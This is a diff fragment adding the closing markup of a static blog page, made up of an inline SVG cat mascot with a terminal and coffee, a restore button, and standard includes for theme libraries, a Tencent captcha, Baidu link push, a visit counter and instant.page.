+            <ellipse class="blog-pet__shadow" cx="91" cy="176" rx="54" ry="8"/>
+            <g class="blog-pet__tail">
+                <path d="M126 142 C169 154 169 112 150 110 C138 109 137 124 148 124" fill="none" stroke="#e7a34e" stroke-width="15" stroke-linecap="round"/>
+                <path d="M151 110 C139 108 137 122 147 124" fill="none" stroke="#61452f" stroke-width="15" stroke-linecap="round"/>
+            </g>
+
+            <g class="blog-pet__body">
+                <ellipse cx="55" cy="155" rx="28" ry="20" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3"/>
+                <ellipse cx="124" cy="155" rx="28" ry="20" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3"/>
+                <path d="M49 110 Q49 91 68 88 L111 88 Q132 94 133 118 L137 153 Q123 169 91 169 Q58 169 43 153 Z" fill="url(#blogPetDenim)" stroke="#263b4b" stroke-width="3"/>
+                <path d="M69 91 L90 111 L111 91" fill="none" stroke="#8bb2c4" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M89 111 L89 125" stroke="#42e8a7" stroke-width="3" stroke-linecap="round"/>
+                <circle cx="89" cy="127" r="4" fill="#42e8a7"/>
+
+                <g class="blog-pet__terminal">
+                    <rect x="61" y="119" width="59" height="38" rx="6" fill="#17262d" stroke="#80a4b5" stroke-width="2"/>
+                    <circle cx="69" cy="126" r="2" fill="#ff7b72"/>
+                    <circle cx="76" cy="126" r="2" fill="#f2cc60"/>
+                    <circle cx="83" cy="126" r="2" fill="#42e8a7"/>
+                    <path d="M70 136 L75 140 L70 144 M80 145 L94 145" fill="none" stroke="#42e8a7" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path class="blog-pet__cursor" d="M99 140 L99 146" stroke="#e6edf3" stroke-width="2"/>
+                </g>
+
+                <ellipse class="blog-pet__paw blog-pet__paw--left" cx="58" cy="139" rx="14" ry="12" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3"/>
+                <ellipse class="blog-pet__paw blog-pet__paw--right" cx="123" cy="139" rx="14" ry="12" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3"/>
+                <path d="M52 140 L55 144 M60 140 L62 144 M117 140 L120 144 M125 140 L127 144" stroke="#9c6b39" stroke-width="2" stroke-linecap="round"/>
+            </g>
+
+            <g class="blog-pet__head">
+                <path d="M45 52 L38 24 Q38 18 44 21 L66 35 Z" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3" stroke-linejoin="round"/>
+                <path d="M114 35 L137 21 Q143 18 142 26 L136 54 Z" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3" stroke-linejoin="round"/>
+                <path d="M46 42 L43 29 L56 37 Z M125 37 L137 29 L134 44 Z" fill="#d98070"/>
+                <path d="M42 59 Q43 35 66 31 Q90 23 115 32 Q137 38 139 62 L136 89 Q128 112 91 116 Q54 113 44 91 Z" fill="url(#blogPetFur)" stroke="#513f32" stroke-width="3"/>
+
+                <g fill="#8c6037">
+                    <path d="M69 34 L74 43 L65 42 Z M88 30 L92 40 L83 39 Z M108 34 L113 43 L103 42 Z"/>
+                    <circle cx="50" cy="62" r="4"/><circle cx="58" cy="51" r="3"/>
+                    <circle cx="130" cy="61" r="4"/><circle cx="122" cy="50" r="3"/>
+                    <circle cx="48" cy="81" r="3"/><circle cx="134" cy="81" r="3"/>
+                </g>
+
+                <path d="M54 64 Q65 56 76 64 M105 64 Q116 56 127 64" fill="none" stroke="#65492f" stroke-width="3" stroke-linecap="round"/>
+                <g class="blog-pet__eye">
+                    <ellipse cx="66" cy="72" rx="10" ry="9" fill="#fff8e7"/>
+                    <g class="blog-pet__pupil">
+                        <ellipse cx="66" cy="72" rx="5" ry="7" fill="#2e8b70"/>
+                        <ellipse cx="66" cy="73" rx="2" ry="5" fill="#17262d"/>
+                        <circle cx="64" cy="69" r="1.5" fill="#fff"/>
+                    </g>
+                </g>
+                <g class="blog-pet__eye">
+                    <ellipse cx="115" cy="72" rx="10" ry="9" fill="#fff8e7"/>
+                    <g class="blog-pet__pupil">
+                        <ellipse cx="115" cy="72" rx="5" ry="7" fill="#2e8b70"/>
+                        <ellipse cx="115" cy="73" rx="2" ry="5" fill="#17262d"/>
+                        <circle cx="113" cy="69" r="1.5" fill="#fff"/>
+                    </g>
+                </g>
+
+                <ellipse cx="90" cy="94" rx="29" ry="18" fill="#ffe5b0"/>
+                <path d="M84 87 Q90 83 96 87 Q95 94 90 94 Q85 93 84 87" fill="#70473d"/>
+                <path d="M90 94 L90 98 M90 98 Q84 105 79 99 M90 98 Q96 105 101 99" fill="none" stroke="#70473d" stroke-width="2.5" stroke-linecap="round"/>
+                <path d="M58 91 L34 87 M58 97 L33 100 M122 91 L147 87 M122 97 L147 100" fill="none" stroke="#72563f" stroke-width="2" stroke-linecap="round"/>
+                <path class="blog-pet__blush" d="M52 88 L60 85 M121 85 L129 88" stroke="#e58c79" stroke-width="4" stroke-linecap="round" opacity=".65"/>
+            </g>
+
+            <g class="blog-pet__coffee" fill="none" stroke="#f2f2f2" stroke-width="3" stroke-linecap="round">
+                <path d="M142 86 C133 79 150 75 142 66"/>
+                <path d="M153 91 C144 84 161 80 153 71"/>
+            </g>
+        </svg>
+        <span class="blog-pet__sleep" aria-hidden="true">Zzz</span>
+        <span class="blog-pet__reaction" aria-hidden="true">+1</span>
+    </button>
+</div>
+<button id="blogPetRestore" class="blog-pet__restore" type="button" hidden>
+    <i class="fas fa-paw" aria-hidden="true"></i>
+    <span>啤啤</span>
+</button>
+
+    
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+    
+        <script src="/js/blog-pet.js"></script>
+    
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://events.vercount.one/js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
